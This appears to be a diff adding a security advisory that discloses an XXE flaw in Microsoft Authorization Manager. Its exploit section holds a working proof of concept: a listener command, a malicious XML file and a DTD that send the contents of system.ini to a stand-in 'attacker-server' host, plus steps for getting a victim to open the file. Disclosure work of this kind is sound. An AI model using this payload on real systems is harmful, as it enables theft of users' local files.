@@ -1,0 +1,137 @@
+[+] Credits: John Page aka hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source: http://hyp3rlinx.altervista.org/advisories/MICROSOFT-AZMAN-XXE-FILE-EXFILTRATION.txt
+
+[+] ISR: ApparitionSec
+
+
+
+Vendor:
+==================
+www.microsoft.com
+
+
+
+Product:
+==============================
+Microsoft Authorization Manager
+v6.1.7601
+
+The Authorization Manager allows you to set role-based permissions for
+Authorization Manager-enabled applications.
+
+You can store authorization stores in either XML files, Active Directory
+Domain Services (AD DS), Active Directory Lightweight Directory
+Services (AD LDS), or in Microsoft SQL Server databases.
+
+
+
+Vulnerability Type:
+===================
+XML External Entity
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+
+"msxml3.dll" DLL is used by "Microsoft Management Console"  azman.msc  /
+eventvwr.msc and other Windows components to process XML files.
+
+The parser processes XML External Entity nodes allowing external
+connections to be made to remote malicious DTD documents that can
+potentially
+allow access to files on users system to be exfiltrated to a remote server.
+Therefore the XML parser is vulnerable to XXE attack if a user
+unknowingly opens a malicious XML 'authorization store' document via remote
+share/USB into 'Authorization Manager'.
+
+"C:\Windows\system32\mmc.exe"
+"C:\Windows\system32\azman.msc"
+"C:\Windows\System32\msxml3.dll"
+
+
+Exploit code(s):
+===============
+
+Start our listener on attacker server to access users files.
+python -m SimpleHTTPServer 8080
+
+
+Create the evil XML file with following payload to steal "system.ini" as
+data theft POC.
+
+<?xml version="1.0"?>
+<!DOCTYPE roottag [
+<!ENTITY % file SYSTEM "C:\Windows\system.ini">
+<!ENTITY % dtd SYSTEM "http://attacker-server:8080/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+
+Next, create the "payload.dtd" DTD document to host on attacker server.
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker-server:8080?%file;'>">
+%all;
+
+
+
+1) Go to Windows CL and type azman to bring up Authorization Manager
+
+2) Go to Action / "Open Authorization store..."
+
+3) Select authorization store type to be 'XML file'
+
+4) Browse to open the "PWN.XML" authorization store file and click Ok
+
+
+User will see error message "Cannot open the authorization store. The
+following problem occurred: An attempt was made
+to load a program with an incorrect format."
+
+Result: files delivered to your server!
+
+
+
+
+Disclosure Timeline:
+===========================================
+Vendor Notification:  August 30, 2016
+Vendor Reply: August 30, 2016
+does not meet the bar for servicing as someone would have to
+obtain the XML from an untrusted source or compromised source"
+December 4, 2016 : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Local / Remote
+
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
